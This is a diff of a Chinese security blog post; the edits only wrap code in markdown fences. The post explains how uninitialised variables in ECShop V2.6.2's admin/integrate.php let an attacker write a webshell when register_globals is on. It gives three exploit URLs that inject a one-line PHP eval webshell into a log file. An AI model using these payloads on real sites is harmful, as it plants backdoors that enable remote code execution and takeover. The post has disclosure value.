@@ -14,7 +14,7 @@ ViewNums: 3149
 ECSHOP前段时间出了个注射漏洞：<http://bbs.wolvez.org/topic/67/>，拿后台权限应该没有问题，但文章没有提及如何[ECShop网店系统< =V2.6.2 后台拿webshell](/blog/ecshop-v262-webshell)。昨天可乐在t00ls.Net上发帖问如何拿shell，无聊中我baidu、 google了下，网上貌似没有拿shell的办法。好久没读代码了，无聊中下了ECSHOP最新版（V2.6.2）的源码过来读，很庆幸，给我找到一个可以直接写shell的文件。与注射一样，同样是个变化未初始化导致的问题，于是，同样只能用在register_globals为on的环境下。
 
 integrate.php第740行起：
-
+```php
 if ($_REQUEST['act'] == 'sync')
 {
 $size = 100;
@@ -67,13 +67,15 @@ $smarty->assign('tasks', $tasks);
 $smarty->assign('ur_here',$_LANG['user_sync']);
 $smarty->assign('size', $size);
 $smarty->display('integrates_sync.htm');
-}$del_list、$rename_list、$ignore_list均没有初始化，于是，均可以直接写shell。
+}
+```
+$del_list、$rename_list、$ignore_list均没有初始化，于是，均可以直接写shell。
 
 利用方法：
-
+```
 http://www.oldjun.com/admin/integrate.php?act=sync&del_list=<?php%20eval($_POST[cmd])?>
 http://www.oldjun.com/admin/integrate.php?act=sync&rename_list=<?php%20eval($_POST[cmd])?>
 http://www.oldjun.com/admin/integrate.php?act=sync&ignore_list=<?php%20eval($_POST[cmd])?>三个链接，随便输入一个就可以了，生成http://www.oldjun.com/data/integrate__log.php，就是一句话小马了~
-
+```
 From:[www.oldjun.com](http://www.oldjun.com/)
 
